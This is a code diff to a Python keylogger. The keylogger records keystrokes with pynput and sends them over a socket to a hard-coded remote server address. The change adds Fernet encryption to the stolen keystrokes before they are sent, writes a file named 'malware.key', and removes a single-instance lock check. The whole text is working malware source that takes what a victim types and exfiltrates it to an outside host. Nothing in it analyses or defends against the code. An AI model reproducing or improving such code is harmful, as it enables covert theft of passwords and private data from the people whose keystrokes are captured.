@@ -1,14 +1,30 @@
 from pynput.keyboard import Listener
+from cryptography.fernet import Fernet
 import socket
 import threading
 import time
-import os
-import sys
 
-SERVER = ''
+SERVER = '100.84.214.3'
 PORT = 9090
 listener_active = False
 keystrokes = []  # In-memory storage for keystrokes
+
+#generate a key
+def generate_key():
+    key = Fernet.generate_key()
+    with open("malware.key", "wb") as key_file:
+        key_file.write(key)
+
+#load key
+def load_key():
+    return open("malware.key", "rb").read()
+
+#for encrypting message
+def encryption_message(message):
+    key = load_key()
+    f = Fernet(key)
+    encrypted_message = f.encrypt(message.encode())
+    return encrypted_message
 
 # SOCKETS
 def send_keystrokes(keystrokes_data):
@@ -23,9 +39,10 @@ def send_keystrokes(keystrokes_data):
         if response.decode('utf-8') == 'restart_listener':
             listener_active = False
 
-        # Convert list of keystrokes to string and send
+        # Ecrypt message before sending
         keystrokes_str = ''.join(keystrokes_data)
-        s.sendall(keystrokes_str.encode('utf-8'))
+        encrypted_message = encryption_message(keystrokes_str)
+        s.sendall(encrypted_message)
     print('Keystrokes sent Successfully')
 
 # Keylogger key
@@ -44,17 +61,8 @@ def start_listener():
     listener_thread.start()
     listener_active = True
 
-# Path to a lock file
-lock_file_path = os.path.join(os.getenv('TEMP'), 'myapp.lock')
 
-# Check if the lock file already exists
-if os.path.exists(lock_file_path):
-    print("An instance is already running.")
-    sys.exit(0)
-else:
-    # Create a lock file to signal that the instance is running
-    with open(lock_file_path, 'w') as f:
-        f.write("Running")
+generate_key()
 
 while True:
     if not listener_active:
